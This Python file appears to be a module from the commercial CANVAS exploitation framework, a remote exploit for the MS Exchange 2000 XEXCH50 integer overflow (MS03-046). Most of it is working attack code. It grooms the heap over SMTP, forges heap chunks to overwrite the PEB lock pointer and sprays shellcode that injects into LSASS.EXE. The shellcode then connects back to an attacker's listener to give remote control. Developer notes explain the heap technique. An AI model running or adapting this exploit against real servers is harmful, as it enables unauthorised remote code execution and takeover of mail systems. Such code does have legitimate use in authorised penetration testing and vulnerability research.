#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import time

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("./exploits/recon/osdetect")
sys.path.append("../../exploits/recon/osdetect")
sys.path.append("./MOSDEF")
sys.path.append("../../MOSDEF")

from exploitutils import *
import addencoder
import chunkedaddencoder
import win32shell
from tcpexploit import tcpexploit
import mosdef
import shellcodeGenerator
import canvasengine
from socket import *
import smtplib

# GUI info
NAME="MS Exchange 2000 XEXCH50 integer overflow (ms03-046)"
DESCRIPTION="MS Exchange 2000 contains a flaw when handling the XEXCH50 command"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['MSRC']="http://www.microsoft.com/technet/security/bulletin/ms03-046.asp"
DOCUMENTATION["NOTE"]=""
DOCUMENTATION["CVE Name"] = "CVE-2003-0714"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0714"
DOCUMENTATION['CVSS'] = 7.5

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] = [ "NT", "2000", "XP", "2003" ]
PROPERTY['MSADV']="MS03-046"

GTK2_DIALOG="dialog.glade2"


CHANGELOG="""

"""

NOTES="""
 Getting a Write4 primitive through RtlAllocateHeap, a more reliable approach.

 Our approach on this exploit is to play with the heap layout until we get this
layout:

Address    Message
           Heap Dump started at address: 0x01b7dfb8
           ==============================================================
01B7DFB8   [0x01b7dfb8]
01B7DFB8      size:  0x00000002 (0x00000010)  psize: 0x0000000a (0x00000050)
01B7DFB8      segndx:0x00000000   flags: 0x00000001   (B)
01B7DFC8   [0x01b7dfc8]
01B7DFC8      size:  0x00000002 (0x00000010)  psize: 0x00000002 (0x00000010)
01B7DFC8      segndx:0x00000000   flags: 0x00000000   (F)
01B7DFC8      next:  0x01b30188   prev:  0x01b30188
01B7DFD8   [0x01b7dfd8]
01B7DFD8      size:  0x00000006 (0x00000030)  psize: 0x00000002 (0x00000010)
01B7DFD8      segndx:0x00000000   flags: 0x00000001   (B)

 Instead of the common approach (overwriting the BUSY chunk, and forcing normal
consolidation or virtual allocation consolidation with RtlFreeHeap), what we are doing
is overwriting a Free chunk that is located on a entry of the  FreeList, and
when RtlAllocateHeap try to allocate a new entry it will unlink it from its list, and
voila! We have our Write4 primitive.
 I used this approach cause the busy chunk that i first overwrite didn't get freed. Giving
thoughs on the fly, this approach is quite interesting, first cause whatever we craft the
chunk (for example: set chunk->flags to "FREE") would be unlinked, this would for example
protect us if we write overwrite the wrong chunk and the overwrite chunk is triggered by
another function, for example RtlFreeHeap (sometimes is an advantage, sometimes dont thats
exploit specific).
On the other hand, this approach will almost assure us that the unlink (in comparasion with
free technique, that sometimes boundaries chunks didnt get freed, like ths case) gets
triggered simply requesting mem from the heap until triggering the right one.

 Putting all the pieces together, we play with the heap layout creating RtlHeapAllocate(0)
until we get a free chunk to overwrite, once the mayhem is released, we trigger the Write4
writing PEbAcquireLock and memleaking to allocate our shellcode and finally a couple of smtp
commands are used to trigger the PEBAcquireLock.

"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 25
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = "\x00\r\n\\/.:$"
        self.name=NAME

        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.localhost=host
        self.localport=port

        sc = shellcodeGenerator.win32()

        shellcode = self.createHeapSafeInjectIntoProcess(self.badstring, host, port, smallcode=0, processname="LSASS.EXE")

        import mosdef
        #           GET EIP, MOV "ret", -0x10(%eip)
        selfmodify= "\xe8\xff\xff\xff\xff\xc3\x5f" + mosdef.assemble("movl $0x4141feeb, -0x10(%edi)", "X86")

        self.shellcode= "\x42" * 0x50+selfmodify + shellcode

        self.log("length of real shellcode: %d"%(len(self.shellcode)))
        return self.shellcode


    def test(self):
        pass

    def run(self):
        self.host=self.target.interface

        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=1)
        import timeoutsocket
        try:
            ret=self.MemLeak(1024*1024*4)
            if not ret:
                self.log("Could not do memleak")
                return 0
            ret=self.MemLeak(1024*1024)
        except timeoutsocket.Timeout:
            pass
        self.nextProgress()
        for a in range(0, 8):
            try:
                for a in range(0, 10):
                    self.Play()
            except timeoutsocket.Timeout:
                self.log("If this is the second time you run the exploit, you will probably success")
                return 1
            self.nextProgress()
            chunk = self.createChunk(0x7ffdf020-4, 0x0d300444)
            self.exploitIT(-1, chunk)
            self.nextProgress()
            self.Play()
            try:
                self.TriggerPEBLock()
            except timeoutsocket.Timeout:
                pass
            except smtplib.SMTPServerDisconnected:
                pass
            self.log("Now you need to wait less than a couple of minutes, to the PebLock overwrite trigger the Shellcode")
            self.log("If didn't work, try to run the exploit again.")
            time.sleep(2)

    def createChunk(self, where, what):
        buf=""

        # first faked chunk
        csize = 0x2
        cpsize= 0x2
        cflag = 0x00
        csegndx= 0x41
        cpad= 0x4141

        buf+= struct.pack("<H", csize)
        buf+= struct.pack("<H", cpsize)
        buf+= chr(csegndx)
        buf+= chr(cflag)
        buf+= struct.pack("<H", cpad)
        buf+= struct.pack("<L", where)
        buf+= struct.pack("<L", what)

        return buf

    def MemLeak(self, size):
        try:
            s= smtplib.SMTP(self.host, self.port)
        except:
            self.log("Could not connect for memleak...")
            return 0
        s.sock.set_timeout(20)

        s.ehlo()
        if not s.has_extn("XEXCH50"):
            return 0
        s.docmd("MAIL FROM: Administrator")
        s.docmd("RCPT TO: Administrator")

        s.docmd("XEXCH50 %d 2" % size)
        size=size-2
        opcode=mosdef.assemble("jmp $0x41", "X86")
        buf=opcode * ( (size-len(self.shellcode))/len(opcode))+self.shellcode
        buf+= "Z" * (len(buf) % len(opcode))
        s.docmd(buf)
        return 1

    def Play(self, size=-1):
        try:
            s= smtplib.SMTP(self.host, self.port)
        except:
            self.log("Could not connect to SMTP port")
            return 0
        s.sock.set_timeout(20)

        s.ehlo()
        if not s.has_extn("XEXCH50"):
            return 0
        s.docmd("MAIL FROM: Administrator")
        s.docmd("RCPT TO: Administrator")
        #for b in range(1, 5):
        #    a=0xc0
             #print "(%d)" % b
        #    print s.docmd("XEXCH50 4 2")
        #    print s.docmd("Z"*2)
        #print "CONTINUE?"
        #sys.stdin.read(1)
        if size:
            s.docmd("XEXCH50 %d 2" % size)
        ##s.sock.send("\x00")
        #s.sock.close()

    def exploitIT(self, size, buf):
        try:
            s= smtplib.SMTP(self.host, self.port)
        except:
            #no port open
            return 0
        s.sock.set_timeout(20)

        s.ehlo()
        if not s.has_extn("XEXCH50"):
            return 0
        s.docmd("MAIL FROM: Administrator")
        s.docmd("RCPT TO: Administrator")
        #for b in range(1, 500):
        #    a=0xc0
        #    print s.docmd("XEXCH50 4 2")
        #    print s.docmd("Z"*2)

        #print "CONTINUE?"
        #sys.stdin.read(1)
        s.docmd("XEXCH50 %d 2" % size)
        s.sock.send(buf)
        s.sock.close()

    def TriggerPEBLock(self):
        s= smtplib.SMTP(self.host, self.port)
        s.ehlo()
        s.helo()
        s.help()
        s.docmd("RSET")
        s.docmd("STARTTLS")
        for a in range(0, 2):
            s.docmd("AUTH")
        s.sendmail("Administrator", "Administrator", "A" * 50)
        s.sendmail("Administrator", "Administrator", "B" * 50)


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
